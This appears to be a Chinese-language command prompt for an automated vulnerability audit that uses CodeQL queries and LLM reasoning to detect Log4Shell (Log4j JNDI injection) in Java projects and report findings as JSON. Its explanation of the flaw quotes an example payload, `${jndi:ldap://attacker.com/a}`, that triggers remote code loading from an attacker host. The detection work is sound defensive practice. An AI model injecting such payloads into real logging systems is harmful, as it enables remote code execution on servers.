---
description: LOG4J_JNDI 漏洞审计（CodeQL + LLM 分析）
---

对指定 CodeQL 数据库执行 LOG4J_JNDI 漏洞审计，以 JSON 数组输出发现报告。

**数据库路径**：$ARGUMENTS

---

## 阶段 1：运行 CodeQL 查询

查询文件位于本项目 `src/codeql/java/log4j_jndi/` 目录。

```bash
AUDIT_TMP=$(mktemp -d)
DB="$ARGUMENTS"

for QL in log4j_taint log4j_calls; do
  "$AUDIT_PYTHON" scripts/codeql_locked.py query run --database "$DB" \
    --output "$AUDIT_TMP/${QL}.bqrs" \
    "src/codeql/java/log4j_jndi/${QL}.ql" 2>&1 || true
  [ -f "$AUDIT_TMP/${QL}.bqrs" ] && \
    codeql bqrs decode "$AUDIT_TMP/${QL}.bqrs" \
      --format=json --output "$AUDIT_TMP/${QL}.json" 2>&1 || true
done
```

读取所有生成的 JSON 文件（$AUDIT_TMP/*.json）的内容。

---

## 阶段 2：漏洞判断

# Log4j JNDI 注入（Log4Shell）检测专家

你是专精 Log4Shell（CVE-2021-44228）漏洞的安全审计专家。

## 核心概念

Log4j 2.x（< 2.15.0）在处理日志消息时会解析 `${...}` 表达式（lookup），
攻击者通过注入 `${jndi:ldap://attacker.com/a}` 触发 JNDI 查找，
使服务端加载并执行远程代码（RCE），CVSS 评分 10.0。

**受影响版本**：log4j-core 2.0-beta9 ~ 2.14.1
**部分缓解版本**：2.15.0（默认禁用 JNDI，但可绕过）
**完全修复版本**：2.17.1+（或 1.x 系列，但 1.x 已 EOL 且有其他漏洞）

## 推理步骤

### 1. 版本检查（首要条件）
查看 tech_profile 中的依赖列表：
- 包含 `org.apache.logging.log4j:log4j-core:2.x`（x < 15）→ **受影响**
- 包含 `org.apache.log4j:log4j:1.x` → Log4j 1.x，不受 Log4Shell 影响，但有其他已知漏洞
- 未找到 log4j → 可通过 SLF4J 间接使用，仍需检查

### 2. 一次性收集证据
依次调用：
- `trace_log4j_taint`（污点路径，最重要）
- `find_log4j_calls`（所有日志调用点）

### 3. 判断漏洞
- `trace_log4j_taint` 返回非空 → 存在用户输入→Logger 的数据流
  - 版本在受影响范围 → **CRITICAL RCE**
  - 版本未确定 → **HIGH**
- `trace_log4j_taint` 为空但 `find_log4j_calls` 返回日志调用 → 手工检查是否参数含 HTTP 请求值
- 版本 ≥ 2.17.1 → 可能已修复，降级为 LOW

## 判断标准

| 场景 | 严重度 |
|------|--------|
| 用户输入→Logger + 版本 2.0~2.14.1 | CRITICAL |
| 用户输入→Logger + 版本未知/2.15~2.16 | HIGH |
| 用户输入→Logger + 版本 ≥ 2.17.1 | LOW（已修复） |
| 无用户输入流向 Logger | 安全，不上报 |
| 置信度 < 0.65 | 跳过 |

使用 `rule_id`：`log4shell-taint`（污点追踪）、`log4j-version-vulnerable`（版本匹配）。

**build-mode=none 限制**：CodeQL 数据库以 build-mode=none 构建，跨方法污点路径不完整属正常现象。
Sink 参数为**非字面量表达式**（变量、方法调用、字符串拼接）即可上报，不要因为缺少完整 Source→Sink 路径而拒绝上报。

---

## 阶段 3：输出报告

以 JSON 数组格式输出所有发现，无发现时输出 `[]`。

```json
[
  {
    "rule_id": "...",
    "title": "...",
    "severity": "CRITICAL|HIGH|MEDIUM|LOW",
    "confidence": 0.80,
    "file": "src/main/java/...",
    "line": 42,
    "description": "具体漏洞描述",
    "evidence": "引用查询结果中的关键字段"
  }
]
```

输出时**只输出 JSON 数组**，不要添加任何其他说明文字。
